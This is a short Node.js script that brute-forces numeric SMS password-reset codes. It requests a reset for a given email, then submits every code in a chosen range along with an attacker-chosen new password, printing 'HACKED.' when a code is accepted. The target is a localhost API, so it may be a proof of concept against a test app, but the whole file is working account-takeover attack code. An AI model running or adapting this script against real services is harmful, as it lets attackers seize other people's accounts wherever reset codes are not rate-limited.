const _cliProgress = require('cli-progress');
const _colors = require('colors');

const axios = require('axios');
const argv = require('optimist')
    .usage('Usage: $0 --email [test@mail.com] --password [hacked] --start [1000] --end [10000]')
    .demand([ 'email', 'password', 'start', 'end' ])
    .argv;


const progressBar = new _cliProgress.Bar({ barsize: 120 }, {
    format: _colors.green(' {bar}') + ' {percentage}% | ETA: {eta}s | {value}/{total}',
    barCompleteChar: '\u2588',
    barIncompleteChar: '\u2591'
});

const APP_URL = 'http://localhost:8080/api/v1/';

async function createAction(email) {
    const { data } = await axios.post(`${APP_URL}users/resetPasswordBySMS`, {
        data : {
            email
        }
    });

    if (!data.status) {
        console.log(data);
        if (data.error.code === 'NOT_FOUND') throw 'Email not exist';
        throw 'Create action error.';
    }

    return data;
}

async function submitAction(id, password, code) {
    const { data } = await axios.post(`${APP_URL}actions/${id}`, {
        data : {
            code,
            password,
            confirmPassword : password
        }
    });

    return data.status;
}


async function main({ start, email, end, password }) {
    const action   = await createAction(email);
    const actionId = action.id;
    
    const barValue = end - start;
    progressBar.start(barValue, 0);

    for ( let i = start, k = 0; i < end; i++ ) {
        const result   = await submitAction(actionId, password, i);

        if (result) {
            console.log('\nHACKED.');
            process.exit();
        }

        k++
        progressBar.update(k);
    }

    console.log("Somthing gone wrong =(");
}

main(argv).catch(e => {
    console.error(e);
});

progressBar.stop();
    